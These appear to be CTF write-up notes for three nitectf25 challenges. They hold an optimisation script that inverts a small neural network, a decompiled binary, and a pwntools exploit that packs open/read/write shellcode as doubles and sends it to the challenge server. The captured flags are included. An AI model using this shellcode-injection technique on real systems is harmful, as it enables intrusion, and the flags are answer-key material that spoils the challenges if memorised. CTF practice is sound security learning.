
floating point guardian


mahek@mahek-Inspiron-14-5430:~$ ncat --ssl floating.chals.nitectf25.live 1337
I am the AI Gatekeeper.
Enter your details so I know you are my Master.
Answer these questions with EXACT precision...

[Q1]  What is your height in centimeters? 613.0326938968
613.0326938968
[Q2]  What is your weight in kilograms? -270.4008767656
-270.4008767656
[Q3]  What is your age in years? 915.1968338307
915.1968338307
[Q4]  What is your heart rate (bpm)? 69.5920167864
69.5920167864
[Q5]  How many hours do you sleep per night? 681.9955020509
681.9955020509
[Q6]  What is your body temperature in Celsius? 592.0152613252
592.0152613252
[Q7]  How many steps do you walk per day? 178.5459517085
178.5459517085
[Q8]  What is your systolic blood pressure? 67.1567758903
67.1567758903
[Q9]  How many calories do you consume daily? 52.5949295343
52.5949295343
[Q10] What is your BMI (Body Mass Index)? -384.5011708980
-384.5011708980
[Q11] How many liters of water do you drink daily? 914.7639775225
914.7639775225
[Q12] What is your resting metabolic rate (kcal/day)?  -44.5509080266
 -44.5509080266
[Q13] How many hours do you exercise per week? -356.7206594949
-356.7206594949
[Q14] What is your blood glucose level (mg/dL)? -240.9038323568
-240.9038323568
[Q15] Rate this CTF challenge out of 10: 254.3774169166
254.3774169166


Processing through neural network layers...
========================================
MASTER PROBABILITY: 0.7331337418
========================================
You are the master! Here is your flag:
nite{br0_i5_n0t_g0nn4_b3_t4K1n6_any1s_j0bs_34x}





Starting optimization to find inputs that produce target probability...
Target: 0.733133742

This may take a few minutes...

differential_evolution step 1: f(x)= 0.05092091358649109
differential_evolution step 2: f(x)= 0.035481088220825074
differential_evolution step 3: f(x)= 0.035481088220825074
differential_evolution step 4: f(x)= 0.035481088220825074
differential_evolution step 5: f(x)= 0.035481088220825074
differential_evolution step 6: f(x)= 0.012745531017019252
differential_evolution step 7: f(x)= 0.012745531017019252
differential_evolution step 8: f(x)= 0.012745531017019252
differential_evolution step 9: f(x)= 0.012745531017019252
differential_evolution step 975: f(x)= 6.648022132793585e-09
differential_evolution step 976: f(x)= 6.648022132793585e-09
differential_evolution step 977: f(x)= 6.648022132793585e-09
differential_evolution step 978: f(x)= 6.648022132793585e-09
differential_evolution step 979: f(x)= 6.648022132793585e-09
differential_evolution step 980: f(x)= 6.648022132793585e-09
differential_evolution step 981: f(x)= 6.648022132793585e-09
differential_evolution step 982: f(x)= 6.648022132793585e-09
differential_evolution step 983: f(x)= 6.648022132793585e-09
differential_evolution step 984: f(x)= 6.648022132793585e-09
differential_evolution step 985: f(x)= 6.648022132793585e-09
differential_evolution step 986: f(x)= 6.648022132793585e-09
differential_evolution step 987: f(x)= 6.648022132793585e-09
differential_evolution step 988: f(x)= 6.648022132793585e-09
differential_evolution step 989: f(x)= 6.648022132793585e-09
differential_evolution step 990: f(x)= 6.648022132793585e-09
differential_evolution step 991: f(x)= 6.648022132793585e-09
differential_evolution step 992: f(x)= 6.648022132793585e-09
differential_evolution step 993: f(x)= 6.648022132793585e-09
differential_evolution step 994: f(x)= 6.648022132793585e-09
differential_evolution step 995: f(x)= 6.648022132793585e-09
differential_evolution step 996: f(x)= 6.648022132793585e-09
differential_evolution step 997: f(x)= 6.648022132793585e-09
differential_evolution step 998: f(x)= 6.648022132793585e-09
differential_evolution step 999: f(x)= 6.648022132793585e-09
differential_evolution step 1000: f(x)= 6.648022132793585e-09
Polishing solution with 'L-BFGS-B'

============================================================
SOLUTION FOUND!
============================================================

Achieved probability: 0.7331337418
Target probability:   0.7331337420
Difference:           0.000000000173683

============================================================
INPUT VALUES TO SUBMIT:
============================================================
Q1:  Height (cm)         : 613.0326938968
Q2:  Weight (kg)         : -270.4008767656
Q3:  Age (years)         : 915.1968338307
Q4:  Heart rate (bpm)    : 69.5920167864
Q5:  Sleep hours         : 681.9955020509
Q6:  Body temp (C)       : 592.0152613252
Q7:  Steps/day           : 178.5459517085
Q8:  Systolic BP         : 67.1567758903
Q9:  Calories            : 52.5949295343
Q10: BMI                 : -384.5011708980
Q11: Water (L)           : 914.7639775225
Q12: RMR (kcal/day)      : -44.5509080266
Q13: Exercise hrs/wk     : -356.7206594949
Q14: Blood glucose       : -240.9038323568
Q15: CTF rating          : 254.3774169166

============================================================
Copy these values to submit to the server!
============================================================




import numpy as np
from scipy.optimize import differential_evolution
import math

# Network architecture constants
INPUT_SIZE = 15
HIDDEN1_SIZE = 8
HIDDEN2_SIZE = 6
OUTPUT_SIZE = 1
TARGET_PROBABILITY = 0.7331337420

# XOR keys (as regular integers)
XOR_KEYS = [
    0x42, 0x13, 0x37, 0x99, 0x21, 0x88, 0x45, 0x67,
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE
]

# Weight matrices
W1 = np.array([
    [0.523, -0.891, 0.234, 0.667, -0.445, 0.789, -0.123, 0.456],
    [-0.334, 0.778, -0.556, 0.223, 0.889, -0.667, 0.445, -0.221],
    [0.667, -0.234, 0.891, -0.445, 0.123, 0.556, -0.789, 0.334],
    [-0.778, 0.445, -0.223, 0.889, -0.556, 0.234, 0.667, -0.891],
    [0.123, -0.667, 0.889, -0.334, 0.556, -0.778, 0.445, 0.223],
    [-0.891, 0.556, -0.445, 0.778, -0.223, 0.334, -0.667, 0.889],
    [0.445, -0.123, 0.667, -0.889, 0.334, -0.556, 0.778, -0.234],
    [-0.556, 0.889, -0.334, 0.445, -0.778, 0.667, -0.223, 0.123],
    [0.778, -0.445, 0.556, -0.667, 0.223, -0.889, 0.334, -0.445],
    [-0.223, 0.667, -0.778, 0.334, -0.445, 0.556, -0.889, 0.778],
    [0.889, -0.334, 0.445, -0.556, 0.667, -0.223, 0.123, -0.667],
    [-0.445, 0.223, -0.889, 0.778, -0.334, 0.445, -0.556, 0.889],
    [0.334, -0.778, 0.223, -0.445, 0.889, -0.667, 0.556, -0.123],
    [-0.667, 0.889, -0.445, 0.223, -0.556, 0.778, -0.334, 0.667],
    [0.556, -0.223, 0.778, -0.889, 0.445, -0.334, 0.889, -0.556]
])

B1 = np.array([0.1, -0.2, 0.3, -0.15, 0.25, -0.35, 0.18, -0.28])

W2 = np.array([
    [0.712, -0.534, 0.823, -0.445, 0.667, -0.389],
    [-0.623, 0.889, -0.456, 0.734, -0.567, 0.445],
    [0.534, -0.712, 0.389, -0.823, 0.456, -0.667],
    [-0.889, 0.456, -0.734, 0.567, -0.623, 0.823],
    [0.445, -0.667, 0.823, -0.389, 0.712, -0.534],
    [-0.734, 0.623, -0.567, 0.889, -0.456, 0.389],
    [0.667, -0.389, 0.534, -0.712, 0.623, -0.823],
    [-0.456, 0.823, -0.667, 0.445, -0.889, 0.734]
])

B2 = np.array([0.05, -0.12, 0.18, -0.08, 0.22, -0.16])

W3 = np.array([[0.923], [-0.812], [0.745], [-0.634], [0.856], [-0.723]])

B3 = np.array([0.42])

def xor_activate(x, key):
    """XOR activation function"""
    long_val = int(x * 1000000)
    long_val ^= int(key)
    return float(long_val) / 1000000.0

def tanh_activate(x):
    """Tanh activation"""
    return np.tanh(x)

def cos_activate(x):
    """Cosine activation"""
    return np.cos(x)

def sinh_activate(x):
    """Sinh activation (scaled)"""
    return np.sinh(x / 10.0)

def sigmoid(x):
    """Sigmoid activation"""
    return 1.0 / (1.0 + np.exp(-x))

def forward_pass(inputs):
    """Forward pass through the neural network"""
    inputs = np.array(inputs)
    
    # Layer 1: Input -> Hidden1
    hidden1 = np.zeros(HIDDEN1_SIZE)
    for j in range(HIDDEN1_SIZE):
        for i in range(INPUT_SIZE):
            # Apply different activation based on index
            if i % 4 == 0:
                activated = xor_activate(inputs[i], XOR_KEYS[i])
            elif i % 4 == 1:
                activated = tanh_activate(inputs[i])
            elif i % 4 == 2:
                activated = cos_activate(inputs[i])
            else:  # i % 4 == 3
                activated = sinh_activate(inputs[i])
            
            hidden1[j] += activated * W1[i][j]
        
        hidden1[j] += B1[j]
        hidden1[j] = tanh_activate(hidden1[j])
    
    # Layer 2: Hidden1 -> Hidden2
    hidden2 = np.zeros(HIDDEN2_SIZE)
    for j in range(HIDDEN2_SIZE):
        for i in range(HIDDEN1_SIZE):
            hidden2[j] += hidden1[i] * W2[i][j]
        hidden2[j] += B2[j]
        hidden2[j] = tanh_activate(hidden2[j])
    
    # Layer 3: Hidden2 -> Output
    output = 0
    for i in range(HIDDEN2_SIZE):
        output += hidden2[i] * W3[i][0]
    output += B3[0]
    output = sigmoid(output)
    
    return output

def objective_function(inputs):
    """Objective function to minimize - difference from target"""
    try:
        prob = forward_pass(inputs)
        return abs(prob - TARGET_PROBABILITY)
    except:
        return 1e10

# Define reasonable bounds for inputs (health metrics)
bounds = [
    (-1000, 1000),    # Q1: height (cm)
    (-1000, 1000),     # Q2: weight (kg)
    (-1000, 1000),      # Q3: age (years)
    (-1000, 1000),     # Q4: heart rate (bpm)
    (-1000, 1000),        # Q5: sleep hours
    (-1000, 1000),      # Q6: body temp (C)
    (-1000, 1000), # Q7: steps per day
    (-1000, 1000),    # Q8: systolic BP
    (-1000, 1000),  # Q9: calories
    (-1000, 1000),      # Q10: BMI
    (-1000, 1000),        # Q11: water (liters)
    (-1000, 1000),  # Q12: RMR (kcal/day)
    (-1000, 1000),       # Q13: exercise hours/week
    (-1000, 1000),     # Q14: blood glucose (mg/dL)
    (-1000, 1000)        # Q15: CTF rating
]

print("Starting optimization to find inputs that produce target probability...")
print(f"Target: {TARGET_PROBABILITY}")
print("\nThis may take a few minutes...\n")

# Run differential evolution optimization
result = differential_evolution(
    objective_function,
    bounds,
    maxiter=1000,
    popsize=30,
    tol=1e-10,
    seed=42,
    workers=1,
    updating='deferred',
    disp=True
)

print("\n" + "="*60)
print("SOLUTION FOUND!")
print("="*60)

solution = result.x
probability = forward_pass(solution)

print(f"\nAchieved probability: {probability:.10f}")
print(f"Target probability:   {TARGET_PROBABILITY:.10f}")
print(f"Difference:           {abs(probability - TARGET_PROBABILITY):.15f}")

print("\n" + "="*60)
print("INPUT VALUES TO SUBMIT:")
print("="*60)

questions = [
    "Q1:  Height (cm)",
    "Q2:  Weight (kg)",
    "Q3:  Age (years)",
    "Q4:  Heart rate (bpm)",
    "Q5:  Sleep hours",
    "Q6:  Body temp (C)",
    "Q7:  Steps/day",
    "Q8:  Systolic BP",
    "Q9:  Calories",
    "Q10: BMI",
    "Q11: Water (L)",
    "Q12: RMR (kcal/day)",
    "Q13: Exercise hrs/wk",
    "Q14: Blood glucose",
    "Q15: CTF rating"
]

for i, (q, val) in enumerate(zip(questions, solution)):
    print(f"{q:25s}: {val:.10f}")

print("\n" + "="*60)
print("Copy these values to submit to the server!")
print("="*60)


IEEE Dancer


undefined8 main(void)

{
  int iVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  int local_38;
  int local_34;
  code *local_30;
  size_t local_28;
  void *local_20;
  code *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("enter the number of floats you want to enter!");
  __isoc99_scanf(&DAT_00102056,&local_38);
  if (100 < local_38) {
    puts("too much");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  local_30 = (code *)calloc((long)local_38,8);
  if (local_30 == (code *)0x0) {
    perror("calloc");
    uVar2 = 1;
  }
  else {
    for (local_34 = 0; local_34 < local_38; local_34 = local_34 + 1) {
      __isoc99_scanf(&DAT_00102069,local_30 + (long)local_34 * 8);
    }
    local_28 = sysconf(0x1e);
    local_20 = (void *)((ulong)local_30 & -local_28);
    iVar1 = mprotect(local_20,local_28,7);
    if (iVar1 < 0) {
      perror("mprotect");
      uVar2 = 1;
    }
    else {
      enable_seccomp();
      puts("draining in progress...");
      local_18 = local_30;
      (*local_30)();
      uVar2 = 0;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}


from pwn import *
import struct
import math

context.arch = "amd64"

# Create shellcode that opens and reads flag
# Using execve since seccomp might be restrictive
sc = asm("""
    /* Open file */
    lea rdi, [rip+flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2  /* open syscall */
    syscall

    /* Read file */
    mov rdi, rax  /* fd */
    lea rsi, [rip+buffer]
    mov rdx, 100
    mov rax, 0  /* read syscall */
    syscall

    /* Write to stdout */
    mov rdi, 1  /* stdout */
    lea rsi, [rip+buffer]
    mov rdx, rax  /* bytes read */
    mov rax, 1  /* write syscall */
    syscall

    /* Exit */
    mov rax, 60
    xor rdi, rdi
    syscall

flag:
    .asciz "flag"
buffer:
    .fill 100, 1, 0
""")

print(f"Shellcode length: {len(sc)} bytes")

# Pad to multiple of 8
if len(sc) % 8 != 0:
    sc += b"\x90" * (8 - (len(sc) % 8))

# Convert to 8-byte chunks and pack as doubles
doubles = []
for i in range(0, len(sc), 8):
    chunk = sc[i:i+8]
    # Pack as little-endian 64-bit then unpack as double
    as_int = struct.unpack("<Q", chunk.ljust(8, b"\x90"))[0]
    # Convert to double (Python's struct doesn't directly handle NaN boxing well)
    # Instead, send the raw bytes that will be interpreted as instructions
    doubles.append(struct.unpack("<d", chunk.ljust(8, b"\x90"))[0])

# For debugging: check if any are NaN/inf
for i, d in enumerate(doubles):
    if math.isnan(d) or math.isinf(d):
        print(f"Warning: Double {i} is NaN/inf: {d}")

print(f"Number of doubles needed: {len(doubles)}")

# Connect and send
# p = process("./program")  # local
p = remote("dancer.chals.nitectf25.live", 1337, ssl=True)

p.sendlineafter(b"enter the number of floats you want to enter!", str(len(doubles)).encode())

for d in doubles:
    # Send in scientific notation to preserve precision
    p.sendline(f"{d:.16e}".encode())

p.interactive()


nite{W4stem4n_dr41nss_aLLth3_fl04Ts_int0_ex3cut5bl3_sp4ce}














bonzai bonzo
Congratulations, you found the location. Here's the flag: nite{0n_th3_g4rden_0f_brok3n_dr3am5}

